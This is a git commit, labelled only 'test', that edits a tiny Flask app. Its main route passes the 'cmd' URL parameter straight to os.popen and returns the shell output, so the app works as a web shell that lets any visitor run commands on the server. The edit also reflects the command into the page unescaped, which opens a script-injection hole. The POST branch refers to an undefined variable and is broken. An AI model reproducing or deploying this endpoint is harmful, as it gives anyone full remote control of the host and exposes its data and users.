22b4792fbe577bbb17ff10e5a4b1ea290878d447
LWZXS <newslwz@gmail.com>
2019-02-24 01:34:09 +0800

    test

--- app.py
+++ app.py
@@ -1,23 +1,27 @@
-from flask import Flask,render_template,request
+from flask import Flask, render_template, request
 import os
+
 
 def create_app():
     app = Flask(__name__)
     return app
 
+
 app = create_app()
 
-@app.route("/",methods = ['GET', 'POST'])
+
+@app.route("/", methods=['GET', 'POST'])
 def index():
     if request.method == "GET":
         cmd = request.args.get('cmd')
         line = ''
         for lines in os.popen(str(cmd)).readlines():
-            line = line + lines + "\n"
+            line = line + lines + "<p>"
 
-        return  line
+        return cmd + "<p>" + line
     else:
-        return ''
+        return cmd + "<p>"
+
 
 if __name__ == '__main__':
     app.run()
